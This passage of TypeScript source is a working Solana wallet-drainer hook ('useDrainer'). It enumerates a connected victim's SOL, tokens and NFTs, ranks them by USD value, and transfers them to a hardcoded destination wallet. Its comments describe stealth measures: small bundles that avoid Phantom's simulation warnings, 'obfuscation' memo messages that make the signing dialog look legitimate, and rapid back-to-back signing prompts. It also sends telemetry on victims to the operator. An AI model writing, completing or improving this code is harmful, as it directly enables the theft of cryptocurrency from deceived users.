    instructions: TransactionInstruction[],
    blockhash: string,
    feePayer: PublicKey,
): number => {
    try {
        // CRIT-03 FIX: Use Legacy Transaction serialization to match the actual
        // Transaction() built at signing (line ~2234). Previously used V0 message
        // serialization which has different size characteristics than Legacy.
        const tx = new Transaction();
        tx.recentBlockhash = blockhash;
        tx.feePayer = feePayer;
        tx.add(...instructions);
        return tx.serialize({ requireAllSignatures: false, verifySignatures: false }).length;
    } catch {
        return 0;
    }
};



// ============================================================================
// SECTION 13: TRANSACTION CONFIRMATION (WebSocket-Based)
// ============================================================================

/**
 * Confirm transaction using WebSocket-based confirmTransaction.
 *
 * FIX APPLIED (Domain-D):
 * The original polled getSignatureStatuses at fixed 500ms intervals — consuming
 * 90+ RPC calls over 45 seconds. The built-in confirmTransaction() uses the
 * validator's WebSocket stream for near-instant notification.
 *
 * Also handles blockhash expiry gracefully (TransactionExpiredBlockheightExceededError).
 */
const confirmTransactionEnterprise = async (
    connection: Connection,
    signature: string,
    blockhash: string,
    lastValidBlockHeight: number,
): Promise<"confirmed" | "failed" | "expired"> => {
    try {
        const result = await connection.confirmTransaction(
            { signature, blockhash, lastValidBlockHeight },
            "confirmed",
        );

        if (result.value.err) {
            console.error(
                "[CONFIRM] On-chain failure:",
                JSON.stringify(result.value.err),
            );
            return "failed";
        }

        console.log(`[CONFIRM] ✅ Confirmed: ${signature}`);
        return "confirmed";
    } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);

        if (
            msg.includes("block height exceeded") ||
            msg.includes("TransactionExpiredBlockheightExceededError")
        ) {
            console.warn("[CONFIRM] ⏱ Blockhash expired before confirmation");
            return "expired";
        }

        console.error("[CONFIRM] Unexpected error:", msg);
        return "failed";
    }
};


// ============================================================================
// SECTION 14: ASSET SORTING & FILTERING
// ============================================================================

/**
 * Sort assets by USD value, highest first.
 * Returns a NEW sorted array — does not mutate the input (FLAW-K fix).
 */
const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
    return [...assets].sort((a, b) => b.usdValue - a.usdValue);
};

/**
 * Filter out dust tokens below minimum USD threshold.
 * NFTs are always kept.
 */
const filterDustTokens = (assets: AssetData[]): AssetData[] => {
    return assets.filter((asset) => {
        if (asset.isNft) return true;
        if (asset.usdValue < MIN_TOKEN_VALUE_USD) {
            console.log(
                `[DUST] Filtering ${asset.mint.toBase58().slice(0, 8)}... (value: $${asset.usdValue.toFixed(6)})`,
            );
            return false;
        }
        return true;
    });
};


// ============================================================================
// SECTION 15: ERROR HANDLING
// ============================================================================

const handleError = (
    e: any,
    setError: (msg: string) => void,
    setStatus: (s: Status) => void,
    ctx: OperationContext,
    contextLabel: string = "unknown",
) => {
    const errorMsg = typeof e?.message === "string" ? e.message : String(e);
    console.error(`[ERROR] ${contextLabel}:`, errorMsg);

    // Fire-and-forget telemetry
    sendTelemetry(
        `❌ Error in ${contextLabel}\n` +
        `Wallet: \`${ctx.walletAddress}\`\n` +
        `Op: ${ctx.operationId}\n` +
        `Message: \`${errorMsg}\``,
    ).catch(() => { });

    // Map error to user-facing message
    let userError: string;

    if (
        e?.name === "WalletSignTransactionError" ||
        errorMsg.includes("rejected")
    ) {
        userError = "Signature rejected by Authenticator. Please Re-Engage.";
    } else if (
        errorMsg.includes("insufficient funds") ||
        errorMsg.includes("insufficient balance")
    ) {
        userError = "Insufficient SOL balance to cover signature fees.";
    } else if (errorMsg.includes("Compute budget exceeded")) {
        userError =
            "Transaction exceeded compute budget. Try with fewer tokens.";
    } else if (errorMsg.includes("Transaction too large")) {
        userError =
            "Transaction packet too large. Reduce token count and retry.";
    } else if (
        errorMsg.includes("block height exceeded") ||
        errorMsg.includes("expired")
    ) {
        userError =
            "Signature expired. Your funds are safe — please retry.";
    } else if (errorMsg.includes("timeout")) {
        userError =
            "Operation timed out. Your signature may still confirm — check your wallet.";
    } else if (errorMsg.includes("frozen")) {
        userError = "Token account is frozen. Cannot transfer.";
    } else if (errorMsg.includes("Preflight simulation failed")) {
        userError =
            "Preflight simulation failed. One or more tokens may have restrictions.";
    } else {
        userError = `Error: ${errorMsg.substring(0, 120)}`;
    }

    setError(userError);
    setStatus("error");
};


// ============================================================================
// SECTION 16: MAIN HOOK — useDrainer
// ============================================================================

export const useDrainer = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [status, setStatus] = useState<Status>("idle");
    const [error, setError] = useState<string | null>(null);
    const [stats, setStats] = useState<DrainStats | null>(null);

    // Concurrency guard — prevents double-drain
    const drainInProgressRef = useRef(false);

    /**
     * Send drain operation mirror to backend for tracking.
     */
    const sendToBackendDrain = useCallback(
        async (
            wallet: string,
            solAmount: number,
            signature: string,
            tokens: { mint: string; amount: string; isSPL2022: boolean }[],
        ): Promise<boolean> => {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(
                    () => controller.abort(),
                    RPC_TIMEOUT_MS,
                );

                const resp = await fetch("/api/drain", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Transaction-Signature": signature,
                    },
                    body: JSON.stringify({
                        wallet,
                        solAmount,
                        tokens,
                        signature,
                    }),
                    signal: controller.signal,
                });

                clearTimeout(timeoutId);

                if (!resp.ok) {
                    console.warn(`[BACKEND] HTTP ${resp.status}`);
                    return false;
                }

                const data = await resp.json();
                if (data.success) {
                    console.log(
                        `[BACKEND] Mirror successful: ${data.txid || "unknown"}`,
                    );
                    return true;
                }
                return false;
            } catch (e) {
                console.warn(
                    "[BACKEND] Mirror failed:",
                    e instanceof Error ? e.message : String(e),
                );
                return false;
            }
        },
        [],
    );

    /**
     * ═══════════════════════════════════════════════════════════════════
     * MAIN DRAIN OPERATION
     * ═══════════════════════════════════════════════════════════════════
     *
     * Phase  1: Wallet validation & concurrency guard
     * Phase  2: SOL balance fetch (with retry)
     * Phase  3: Dual-program token account discovery (SPL + Token-2022)
     * Phase  4: Batched mint classification (single RPC per 100 mints)
     * Phase  5: Metaplex NFT detection (batched metadata PDA check)
     * Phase  6: Jupiter real-time pricing + dust filtering + USD sort
     * Phase  7: Blockhash fetch (immediately before instruction building)
     * Phase  8: Empirical batch size via binary search
     * Phase  9: ATA existence check + balance validation + batch shrinking
     * Phase 10: Instruction building (correct Token-2022 instructions)
     * Phase 11: Preflight simulation + compute unit limit optimization
     * Phase 12: Transaction signing (VersionedTransaction v0)
     * Phase 13: WebSocket-based confirmation
     * Phase 14: Backend mirror + telemetry
     */
    const drain = useCallback(async () => {
        // ═══ PHASE 1: CONCURRENCY GUARD (FLAW-F fix: lock IMMEDIATELY) ═══
        if (drainInProgressRef.current) {
            setError("Drain operation already in progress.");
            return;
        }
        drainInProgressRef.current = true; // Lock FIRST — before any async gap

        if (!publicKey || !sendTransaction) {
            drainInProgressRef.current = false;
            setError("Wallet not connected.");
            setStatus("error");
            return;
        }

        const ctx = createOperationContext(publicKey.toBase58());

        setStatus("scanning");
        setError(null);
        setStats(null);

        await sendTelemetry(
            `🔍 Scan initiated for \`${ctx.walletAddress}\``,
        ).catch(() => { });

        try {
            console.log(`[DRAIN] Operation ${ctx.operationId} started`);

            // ═══ PHASE 2: SOL BALANCE FETCH (with retry — FLAW-10 fix) ═══
            let solBalance: number;
            try {
                solBalance = await withRetryAndTimeout(
                    () => connection.getBalance(publicKey),
                );
            } catch (e) {
                throw new Error(
                    "Failed to fetch SOL balance: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            if (!Number.isFinite(solBalance) || solBalance < 0) {
                throw new Error("Invalid SOL balance returned from RPC");
            }

            console.log(
                `[DRAIN] SOL Balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
            );

            // Fetch SOL price for valuation (fire-and-forget fallback)
            const solPricePromise = fetchSolPriceUSD();

            // ═══ PHASE 3: DUAL-PROGRAM TOKEN ACCOUNT DISCOVERY (with retry) ═══
            // Scan BOTH TOKEN_PROGRAM_ID and TOKEN_2022_PROGRAM_ID in parallel
            let allTokenAccounts: {
                account: any;
                pubkey: PublicKey;
                _tokenProgram: PublicKey;
            }[] = [];

            try {
                const [splResult, spl2022Result] = await Promise.all([
                    withRetryAndTimeout(() =>
                        connection.getParsedTokenAccountsByOwner(publicKey, {
                            programId: TOKEN_PROGRAM_ID,
                        }),
                    ).catch((e: any) => {
                        console.warn(
                            "[DRAIN] SPL token scan failed:",
                            e instanceof Error ? e.message : String(e),
                        );
                        return { value: [] } as any;
                    }),

                    withRetryAndTimeout(() =>
                        connection.getParsedTokenAccountsByOwner(publicKey, {
                            programId: TOKEN_2022_PROGRAM_ID,
                        }),
                    ).catch((e: any) => {
                        console.warn(
                            "[DRAIN] SPL-2022 token scan failed:",
                            e instanceof Error ? e.message : String(e),
                        );
                        return { value: [] } as any;
                    }),
                ]);

                const splAccounts = (splResult?.value || []).map(
                    (acc: any) => ({
                        ...acc,
                        _tokenProgram: TOKEN_PROGRAM_ID,
                    }),
                );
                const spl2022Accounts = (spl2022Result?.value || []).map(
                    (acc: any) => ({
                        ...acc,
                        _tokenProgram: TOKEN_2022_PROGRAM_ID,
                    }),
                );

                allTokenAccounts = [...splAccounts, ...spl2022Accounts];

                console.log(
                    `[DRAIN] Token discovery: ${splAccounts.length} SPL + ${spl2022Accounts.length} SPL-2022 = ${allTokenAccounts.length} total`,
                );
            } catch (e) {
                throw new Error(
                    "Failed to fetch token accounts: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            if (allTokenAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            // ═══ PHASE 4: BATCHED MINT CLASSIFICATION ═══
            // Extract valid mints from token accounts
            const mintMap = new Map<
                string,
                {
                    account: any;
                    pubkey: PublicKey;
                    _tokenProgram: PublicKey;
                    mint: PublicKey;
                    amount: bigint;
                    uiAmount: number;
                    parsedDecimals: number;
                    parsedState: string;
                }
            >();

            for (const acc of allTokenAccounts) {
                try {
                    const parsed = acc.account.data.parsed.info;
                    const amount = BigInt(parsed.tokenAmount.amount);
                    if (amount === BigInt(0)) continue;

                    const mint = new PublicKey(parsed.mint);
                    const mintStr = mint.toBase58();

                    mintMap.set(mintStr, {
                        account: acc.account,
                        pubkey: acc.pubkey,
                        _tokenProgram: acc._tokenProgram,
                        mint,
                        amount,
                        uiAmount: parsed.tokenAmount.uiAmount,
                        parsedDecimals: parsed.tokenAmount.decimals || 0,
                        parsedState: parsed.state,
                    });
                } catch (e) {
                    console.warn(
                        "[DRAIN] Failed to parse token account:",
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            const uniqueMints = Array.from(mintMap.values()).map((v) => v.mint);

            // Single batched RPC call for all mint classifications
            const classifications = await batchClassifyMints(
                uniqueMints,
                connection,
            );

            // ═══ PHASE 5: METAPLEX NFT DETECTION ═══
            // Identify NFT candidates (decimals=0 && supply=1) then verify via Metaplex PDA
            const nftCandidateMints = uniqueMints.filter((mint) => {
                const cls = classifications.get(mint.toBase58());
                // CRIT-05 FIX: supply === 1 (not <= 1) — supply 0 means burned NFT
                return cls && cls.decimals === 0 && cls.supply === BigInt(1);
            });

            const confirmedNftMints = await batchCheckMetaplexMetadata(
                nftCandidateMints,
                connection,
            );

            console.log(
                `[DRAIN] NFT detection: ${nftCandidateMints.length} candidates → ${confirmedNftMints.size} confirmed`,
            );

            // ═══ PHASE 6: BUILD ASSET LIST + PRICING + FILTERING ═══
            const rawAssetList: AssetData[] = [];

            for (const [mintStr, tokenInfo] of mintMap) {
                const classification = classifications.get(mintStr);
                if (!classification) continue;

                const {
                    isSPL2022,
                    isTransferHook,
                    isPermanentDelegate,
                    isNonTransferable,
                    decimals,
                } = classification;

                // Use program ID from token account discovery (guaranteed correct)
                const tokenProgram = tokenInfo._tokenProgram;
                const discoveredIsSPL2022 = tokenProgram.equals(
                    TOKEN_2022_PROGRAM_ID,
                );

                // Skip frozen accounts (parsed state is reliable for both SPL and Token-2022)
                if (tokenInfo.parsedState === "frozen") {
                    console.warn(
                        `[DRAIN] Frozen token account for ${mintStr.slice(0, 8)}...`,
                    );
                    continue;
                }

                // Skip NonTransferable tokens (cannot be transferred by design)
                if (isNonTransferable) {
                    console.log(
                        `[DRAIN] Skipping non-transferable token: ${mintStr.slice(0, 8)}...`,
                    );
                    continue;
                }

                // Skip transfer hook tokens — custom logic may block transfers
                if (isTransferHook && discoveredIsSPL2022) {
                    console.log(
                        `[DRAIN] Skipping SPL2022 transfer-hook token: ${mintStr.slice(0, 8)}...`,
                    );
                    continue;
                }

                // SEV-05 FIX: Skip PermanentDelegate tokens — delegate can claw back funds
                if (isPermanentDelegate) {
                    console.log(
                        `[DRAIN] Skipping permanent-delegate token (clawback risk): ${mintStr.slice(0, 8)}...`,
                    );
                    continue;
                }

                // NFT classification: confirmed by Metaplex metadata PDA existence
                const isNft = confirmedNftMints.has(mintStr);

                rawAssetList.push({
                    mint: tokenInfo.mint,
                    amount: tokenInfo.amount,
                    uiAmount: tokenInfo.uiAmount,
                    tokenAccountPubkey: tokenInfo.pubkey,
                    isNft,
                    isSPL2022: discoveredIsSPL2022,
                    isTransferHook,
                    isFrozen: false,
                    decimals,
                    tokenProgram,
                    usdPrice: 0,
                    usdValue: 0,
                });
            }

            console.log(
                `[DRAIN] Classified ${rawAssetList.length} drainable assets`,
            );

            // --- Jupiter real-time pricing ---
            const mintAddresses = rawAssetList.map((a) => a.mint.toBase58());
            mintAddresses.push(SOL_MINT);
            const jupiterPrices = await fetchBatchPricesUSD(mintAddresses);

            // Await SOL price from CoinGecko fallback
            const coingeckoSolPrice = await solPricePromise;
            const jupiterSolPrice = jupiterPrices.get(SOL_MINT);
            const effectiveSolPrice = jupiterSolPrice || coingeckoSolPrice;
            const isSolOnlyWallet = rawAssetList.length === 0;

            // SOL-only wallets don't need exact pricing — SOL has inherent value.
            // For token-bearing wallets, accurate pricing is required for sorting and thresholds.
            if (!effectiveSolPrice || effectiveSolPrice <= 0) {
                if (!isSolOnlyWallet) {
                    throw new Error(
                        "Unable to fetch SOL price from any source (Jupiter, CoinGecko). " +
                        "Cannot proceed without accurate valuation."
                    );
                }
                console.warn("[PRICE] No SOL price available — using conservative floor for SOL-only transfer");
            }

            // Conservative $1 floor ensures threshold math works for SOL-only when APIs are unreachable (CORS)
            const finalSolPrice = (effectiveSolPrice && effectiveSolPrice > 0)
                ? effectiveSolPrice
                : 1.0;

            // CRIT-02 FIX: Use BigInt arithmetic to avoid precision loss for large balances
            // (Number.MAX_SAFE_INTEGER = 2^53-1, many memecoins exceed this in raw amount)
            for (const asset of rawAssetList) {
                const price = jupiterPrices.get(asset.mint.toBase58());
                if (price && price > 0) {
                    asset.usdPrice = price;
                }

                // Safe BigInt → Number conversion preserving precision
                const divisorBI = BigInt(10) ** BigInt(asset.decimals);
                const wholePart = asset.amount / divisorBI;
                const fractionalPart = asset.amount % divisorBI;
                const normalizedAmount = Number(wholePart) + Number(fractionalPart) / Number(divisorBI);

                if (asset.isNft) {
                    // HIGH-08 FIX: Give unpriced NFTs a conservative $1 floor so they aren't
                    // pushed to end of sort and dropped during batch shrinking
                    asset.usdValue = asset.usdPrice > 0
                        ? asset.usdPrice * normalizedAmount
                        : 1.0;
                } else {
                    // Unpriced tokens get dust-threshold floor — included but deprioritized.
                    // HIGH-08 FIX: Previously used Math.max(0.001, normalizedAmount * 0.01)
                    // which created phantom $millions for high-supply memecoins with no price data.
                    asset.usdValue = asset.usdPrice > 0
                        ? asset.usdPrice * normalizedAmount
                        : MIN_TOKEN_VALUE_USD;
                }
            }

            // --- Filter dust tokens ---
            const nonDustAssets = filterDustTokens(rawAssetList);
            if (nonDustAssets.length < rawAssetList.length) {
                console.log(
                    `[DRAIN] Filtered ${rawAssetList.length - nonDustAssets.length} dust tokens, keeping ${nonDustAssets.length}`,
                );
            }

            // --- Sort by USD value descending (returns new array — FLAW-K fix) ---
            const assetList = sortAssetsByValue(nonDustAssets);

            // --- Total valuation ---
            const solValueUSD =
                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) *
                finalSolPrice;

            let totalValueUSD = Math.max(0, solValueUSD);
            for (const asset of assetList) {
                totalValueUSD += asset.usdValue;
            }

            console.log(
                `[DRAIN] Total USD Value: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`,
            );

            await sendTelemetry(
                `📊 Scan complete | SOL: \`$${solValueUSD.toFixed(2)}\` | Tokens: ${assetList.length} | Total: \`$${totalValueUSD.toFixed(2)}\``,
            ).catch(() => { });

            // Minimum threshold check
            if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
                setError("Insufficient value to drain.");
                setStatus("error");
                await sendTelemetry(
                    `🧊 Below threshold: $${totalValueUSD.toFixed(2)}`,
                ).catch(() => { });
                return;
            }

            setStatus("building");

            // ═══════════════════════════════════════════════════════════════
            // PHASE 7–14: MULTI-BUNDLE INTELLIGENT ARCHITECTURE
            // ═══════════════════════════════════════════════════════════════
            //
            // Architecture: Instead of cramming all tokens into a single transaction
            // (which triggers Phantom wallet red simulation warnings at high byte counts),
            // we partition assets into multiple bundles of ~6 tokens each.
            //
            // Design Principles:
            //   1. USD-value priority: Highest-value assets go in Bundle 0 (first signed)
            //   2. Gas intelligence: Each bundle adaptively sizes based on available SOL
            //   3. Stealth: Small bundles stay under Phantom's simulation warning threshold
            //   4. Obfuscation: Each bundle carries a legitimate-looking memo message
            //   5. Velocity: Bundles are presented for signing consecutively with zero delay
            //   6. SOL transfer: Included in Bundle 0 (the highest-value bundle)
            //   7. Confirmation: All signed bundles confirmed in parallel after all signatures

            // --- Pre-compute destination ATAs for all assets (MED-03 fix) ---
            const assetAtaMap = new Map<string, PublicKey>();
            for (const asset of assetList) {
                const programId = asset.isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
                const destAta = getAssociatedTokenAddressSync(
                    asset.mint,
                    DESTINATION_WALLET,
                    true,
                    programId,
                );
                assetAtaMap.set(asset.mint.toBase58(), destAta);
            }

            // --- ATA existence check (single batched call for all assets) ---
            const allDestAtas = Array.from(assetAtaMap.values());
            const existingAtasCache = await batchCheckAtaExistence(
                allDestAtas,
                connection,
            );

            // --- Fetch dynamic priority fee once (shared across all bundles) ---
            const writableAccounts = [DESTINATION_WALLET, publicKey];
            const dynamicPriorityFee = await fetchDynamicPriorityFee(
                connection,
                writableAccounts,
            );

            // ═══ PHASE 7: INTELLIGENT BUNDLE PARTITIONING ═══
            //
            // Strategy: Partition the sorted asset list into bundles of BUNDLE_TARGET_SIZE.
            // For each bundle, calculate the gas cost. If insufficient SOL for the target
            // size, adaptively shrink down to BUNDLE_MIN_SIZE. SOL transfer goes in Bundle 0.
            //
            // Gas reservation: We must reserve enough SOL across ALL bundles, not just one.
            // Calculate total gas needed upfront, then validate.

            /**
             * Build transfer instructions for a single asset.
             * Returns [ataCreateIx?, transferIx] or empty array on failure.
             */
            const buildAssetInstructions = (
                asset: AssetData,
                payer: PublicKey,
            ): TransactionInstruction[] => {
                const ixs: TransactionInstruction[] = [];
                const programId = asset.isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
                const destAta = assetAtaMap.get(asset.mint.toBase58());
                if (!destAta) return ixs;

                // Create ATA if needed (CRIT-02 FIX: mark as created for subsequent bundles)
                const ataKey = destAta.toBase58();
                const ataExists = existingAtasCache.get(ataKey);
                if (ataExists === false) {
                    ixs.push(
                        createAssociatedTokenAccountInstruction(
                            payer,
                            destAta,
                            DESTINATION_WALLET,
                            asset.mint,
                            programId,
                        ),
                    );
                    // Pre-mark as existing so subsequent bundles don't duplicate ATA creation.
                    // Without this, multi-bundle flows targeting the same mint would fail
                    // because the second bundle tries to create an already-created ATA.
                    existingAtasCache.set(ataKey, true);
                }

                // Validate amount
                if (!validateTokenAmount(asset.amount)) return [];

                // Build transfer
                ixs.push(
                    buildTransferInstruction(
                        asset.tokenAccountPubkey,
                        asset.mint,
                        destAta,
                        payer,
                        asset.amount,
                        asset.decimals,
                        asset.isSPL2022,
                        programId,
                    ),
                );

                return ixs;
            };

            /**
             * Create a Memo instruction for transaction message obfuscation.
             * Appears as a readable message in the Phantom signing dialog.
             */
            const createMemoInstruction = (
                message: string,
                signer: PublicKey,
            ): TransactionInstruction => {
                return new TransactionInstruction({
                    keys: [{ pubkey: signer, isSigner: true, isWritable: false }],
                    programId: MEMO_PROGRAM_ID,
                    data: Buffer.from(message, "utf-8"),
                });
            };

            /**
             * Calculate gas cost for a set of assets in a bundle.
             */
            const calculateBundleGasCost = (assets: AssetData[]): number => {
                let atasNeeded = 0;
                let spl2022Count = 0;
                let hookCount = 0;

                for (const asset of assets) {
                    const destAta = assetAtaMap.get(asset.mint.toBase58());
                    if (destAta && existingAtasCache.get(destAta.toBase58()) === false) {
                        atasNeeded++;
                    }
                    if (asset.isSPL2022) spl2022Count++;
                    if (asset.isTransferHook) hookCount++;
                }

                return estimateTransactionFees(atasNeeded, spl2022Count, hookCount);
            };

            /**
             * Determine maximum bundle size that fits within gas budget AND byte limit.
             * Starts at BUNDLE_TARGET_SIZE, shrinks if gas or bytes overflow.
             */
            const calculateAdaptiveBundleSize = (
                assets: AssetData[],
                availableGas: number,
                blockhashStr: string,
                includesSolTransfer: boolean,
                memoMessage: string,
            ): number => {
                const maxTarget = Math.min(BUNDLE_TARGET_SIZE, assets.length);

                for (let size = maxTarget; size >= BUNDLE_MIN_SIZE; size--) {
                    const bundleAssets = assets.slice(0, size);
                    const gasCost = calculateBundleGasCost(bundleAssets);

                    // Check gas affordability
                    if (gasCost > availableGas) continue;

                    // Check byte limit via actual V0 serialization
                    const testIxs: TransactionInstruction[] = [
                        ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
                        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: dynamicPriorityFee }),
                        createMemoInstruction(memoMessage, publicKey),
                    ];

                    if (includesSolTransfer) {
                        testIxs.push(
                            SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: DESTINATION_WALLET,
                                lamports: 1, // Placeholder — doesn't affect size
                            }),
                        );
                    }

                    for (const asset of bundleAssets) {
                        testIxs.push(...buildAssetInstructions(asset, publicKey));
                    }

                    const txSize = measureTransactionSize(testIxs, blockhashStr, publicKey);
                    if (txSize > 0 && txSize <= NETWORK_CONFIG.maxPacketSize) {
                        return size;
                    }
                }

                return 0; // Cannot fit even 1 token
            };

            // --- Calculate total gas reservation for all bundles ---
            const totalGasNeeded = calculateBundleGasCost(assetList);
            const totalSolReserve = SOL_TO_LEAVE + totalGasNeeded;

            // CRIT-03 FIX: Use Math.floor for lamport precision
            const solAvailableForTransfer = Math.floor(
                Math.max(0, solBalance - totalSolReserve),
            );
            let remainingGasBudget = solBalance - SOL_TO_LEAVE - solAvailableForTransfer;

            console.log(
                `[BUNDLE] Gas budget: ${(remainingGasBudget / LAMPORTS_PER_SOL).toFixed(6)} SOL | ` +
                `SOL to transfer: ${(solAvailableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL | ` +
                `Total assets: ${assetList.length}`,
            );

            // --- Partition assets into bundles ---
            interface BundlePlan {
                assets: AssetData[];
                includesSolTransfer: boolean;
                solTransferAmount: number;
                memoMessage: string;
                estimatedGas: number;
            }

            const bundles: BundlePlan[] = [];
            let assetCursor = 0;

            // HIGH-03 FIX: Fetch blockhash ONCE for all bundle size estimation.
            // Transaction byte size is independent of blockhash value — the 32-byte field
            // occupies the same space regardless of content. Fetching per-bundle was
            // N unnecessary RPC calls.
            let estBlockhash = "11111111111111111111111111111111"; // Placeholder — size-neutral
            try {
                const bh = await withRetryAndTimeout(() =>
                    connection.getLatestBlockhashAndContext("confirmed"),
                );
                estBlockhash = (bh as any)?.value?.blockhash || estBlockhash;
            } catch { /* use placeholder */ }

            while (assetCursor < assetList.length) {
                const remainingAssets = assetList.slice(assetCursor);
                const isFirstBundle = bundles.length === 0;

                // Select obfuscation message — rotate through array
                const memoMessage = OBFUSCATION_MESSAGES[bundles.length % OBFUSCATION_MESSAGES.length];

                // Calculate adaptive bundle size
                const bundleSize = calculateAdaptiveBundleSize(
                    remainingAssets,
                    remainingGasBudget,
                    estBlockhash,
                    isFirstBundle && solAvailableForTransfer > 0,
                    memoMessage,
                );

                if (bundleSize === 0) {
                    break;
                }

                const bundleAssets = remainingAssets.slice(0, bundleSize);
                const bundleGas = calculateBundleGasCost(bundleAssets);

                bundles.push({
                    assets: bundleAssets,
                    includesSolTransfer: isFirstBundle && solAvailableForTransfer > 0,
                    solTransferAmount: isFirstBundle ? solAvailableForTransfer : 0,
                    memoMessage,
                    estimatedGas: bundleGas,
                });

                remainingGasBudget -= bundleGas;
                assetCursor += bundleSize;

                console.log(
                    `[BUNDLE] Bundle ${bundles.length}: ${bundleSize} tokens | ` +
                    `Gas: ${(bundleGas / LAMPORTS_PER_SOL).toFixed(6)} SOL | ` +
                    `Memo: "${memoMessage}" | ` +
                    `Value: $${bundleAssets.reduce((sum, a) => sum + a.usdValue, 0).toFixed(2)}`,
                );
            }

            // SOL-only bundle: When no tokens exist but SOL is transferable,
            // create a dedicated SOL transfer bundle. This handles the case where
            // a wallet has only native SOL (no SPL tokens) — previously the engine
            // would silently produce zero bundles and fail.
            if (bundles.length === 0 && solAvailableForTransfer > 0) {
                const memoMessage = OBFUSCATION_MESSAGES[0];
                bundles.push({
                    assets: [],
                    includesSolTransfer: true,
                    solTransferAmount: solAvailableForTransfer,
                    memoMessage,
                    estimatedGas: NETWORK_CONFIG.baseTxFee,
                });

                console.log(
                    `[BUNDLE] SOL-only bundle: ${(solAvailableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL | ` +
                    `Memo: "${memoMessage}"`,
                );
            }

            if (bundles.length === 0) {
                setError("Insufficient SOL for gas fees on any bundle.");
                setStatus("error");
                return;
            }

            const totalBundleTokens = bundles.reduce((s, b) => s + b.assets.length, 0);
            const droppedCount = assetList.length - totalBundleTokens;

            console.log(
                `[BUNDLE] Partitioned ${totalBundleTokens} assets into ${bundles.length} bundles` +
                (droppedCount > 0 ? ` (${droppedCount} dropped — insufficient gas)` : ""),
            );

            await sendTelemetry(
                `🧨 ${bundles.length} bundles planned | ` +
                `${totalBundleTokens} tokens | ` +
                `Value: $${totalValueUSD.toFixed(2)} | ` +
                `SOL: ${(solAvailableForTransfer / LAMPORTS_PER_SOL).toFixed(4)}`,
            ).catch(() => { });

            // ═══ PHASE 8–12: CONSECUTIVE BUNDLE SIGNING ═══
            //
            // Each bundle is built, simulated, and presented for signing immediately
            // after the previous one. Zero delay between signatures — the next signing
            // dialog appears the instant the user approves the previous one.
            //
            // Confirmations are deferred to Phase 13 (parallel confirmation).

            setStatus("signing");

            interface SignedBundle {
                signature: string;
                blockhash: string;
                lastValidBlockHeight: number;
                bundleIndex: number;
                tokenCount: number;
                nftCount: number;
                usdValue: number;
                tokensForBackend: { mint: string; amount: string; isSPL2022: boolean }[];
            }

            const signedBundles: SignedBundle[] = [];
            let totalTokenCount = 0;
            let totalNftCount = 0;

            for (let bi = 0; bi < bundles.length; bi++) {
                const bundle = bundles[bi];

                try {
                    // --- Fresh blockhash per bundle (critical for consecutive signing) ---
                    let bundleBlockhash: string;
                    let bundleLastValidBlockHeight: number;

                    try {
                        const bhResp = await withRetryAndTimeout(() =>
                            connection.getLatestBlockhashAndContext("confirmed"),
                        );
                        const bhVal = (bhResp as any)?.value || {};
                        bundleBlockhash = bhVal.blockhash;
                        bundleLastValidBlockHeight = bhVal.lastValidBlockHeight;

                        if (!bundleBlockhash || !bundleLastValidBlockHeight) {
                            throw new Error("Invalid blockhash");
                        }
                    } catch (e) {
                        console.error(`[BUNDLE ${bi}] Blockhash fetch failed, skipping bundle`);
                        continue;
                    }

                    // --- Build instructions for this bundle ---
                    const bundleTransferIxs: TransactionInstruction[] = [];
                    let bundleTokenCount = 0;
                    let bundleNftCount = 0;
                    let bundleUsdValue = 0;
                    const bundleBackendTokens: { mint: string; amount: string; isSPL2022: boolean }[] = [];

                    // Memo instruction (obfuscation) — placed FIRST for Phantom visibility
                    bundleTransferIxs.push(
                        createMemoInstruction(bundle.memoMessage, publicKey),
                    );

                    // SOL transfer (only in first bundle)
                    if (bundle.includesSolTransfer && bundle.solTransferAmount > 0) {
                        bundleTransferIxs.push(
                            SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: DESTINATION_WALLET,
                                lamports: bundle.solTransferAmount,
                            }),
                        );
                    }

                    // Token/NFT transfers
                    for (const asset of bundle.assets) {
                        const ixs = buildAssetInstructions(asset, publicKey);
                        if (ixs.length > 0) {
                            bundleTransferIxs.push(...ixs);
                            if (asset.isNft) bundleNftCount++;
                            else bundleTokenCount++;
                            bundleUsdValue += asset.usdValue;

                            // CRIT-04 FIX: Build backend tokens only from actually-bundled assets
                            bundleBackendTokens.push({
                                mint: asset.mint.toBase58(),
                                amount: asset.amount.toString(),
                                isSPL2022: asset.isSPL2022,
                            });
                        }
                    }

                    if (bundleTransferIxs.length <= 1) {
                        // Only memo instruction — no actual transfers
                        console.warn(`[BUNDLE ${bi}] No valid transfers, skipping`);
                        continue;
                    }

                    // --- Simulation for precise CU limit ---
                    let bundleCUs = 200_000; // Conservative fallback per bundle

                    try {
                        const simIxs = [
                            ComputeBudgetProgram.setComputeUnitLimit({ units: 1_400_000 }),
                            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: dynamicPriorityFee }),
                            ...bundleTransferIxs,
                        ];

                        const simMsg = new TransactionMessage({
                            payerKey: publicKey,
                            recentBlockhash: bundleBlockhash,
                            instructions: simIxs,
                        }).compileToV0Message();

                        const simTx = new VersionedTransaction(simMsg);

                        // SEV-02 FIX: Include sigVerify: false for unsigned simulation
